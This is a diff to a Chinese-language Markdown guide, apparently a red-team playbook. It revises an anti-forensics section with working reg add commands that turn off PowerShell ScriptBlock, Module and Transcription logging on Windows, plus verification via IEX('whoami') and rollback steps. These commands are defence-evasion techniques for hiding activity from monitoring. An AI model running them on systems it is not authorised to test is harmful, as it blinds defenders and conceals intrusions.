@@ -414,23 +414,42 @@ PowerShell 一句话版本（仅参考检测对抗，本身被签名 / Defender 
 
 ###### 4. 反取证：清除痕迹
 
-###### PowerShell ScriptBlock Logging 关闭
+> **先想清楚要不要做。** 关日志这个动作本身是**检测高危行为**：1102（日志被清）、
+> 4703（令牌权限调整）、PowerShell 组策略变更全都会告警，而且「日志突然停了」
+> 比「日志里有痕迹」更醒目。只在必须争取时间时做，做完要记下改了什么以便回滚。
+
+###### PowerShell ScriptBlock / Module / Transcription 关闭
 
 ```powershell
-###### 注册表（需管理员）
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
-    -Name 'EnableScriptBlockLogging' -Value 0 -Force
+# 这三条组策略键在干净系统上**默认不存在**（实测 Test-Path 为 False）。
+# 所以不能用 Set-ItemProperty —— 它会直接报
+#   "Cannot find path ... because it does not exist"
+# 必须用 reg add（会自动建键），或用 New-Item -Force 先建键。
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
+    /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
 
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
-    -Name 'EnableModuleLogging' -Value 0 -Force
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
+    /v EnableModuleLogging /t REG_DWORD /d 0 /f
 
-Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
-    -Name 'EnableTranscripting' -Value 0 -Force
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
+    /v EnableTranscripting /t REG_DWORD /d 0 /f
 
-###### Group Policy 路径：
-###### Computer Configuration → Administrative Templates → Windows Components →
-######   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
+# 验伤：读回来必须是 0（reg add 成功但键名拼错时不会报错，只会静默不生效）
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging
+
+# 回滚（报告里要写清这三条被你改过）
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /f
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /f
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /f
 ```
+
+**假成功反例**：`reg add` 成功 ≠ 日志真关了。这三个是**组策略键**，若域策略在推
+（`gpresult /h` 能看到），下次 `gpupdate` 会把你的值覆盖回去；而且部分 EDR 直接
+从 ETW provider 取数据，不看注册表。**验伤唯一可靠办法**：执行一条特征命令（如
+`IEX('whoami')`）再看 4104 里有没有新记录。
+
+Group Policy 路径（图形界面）：
+`Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled`
 
 ###### 清 PowerShell history
 
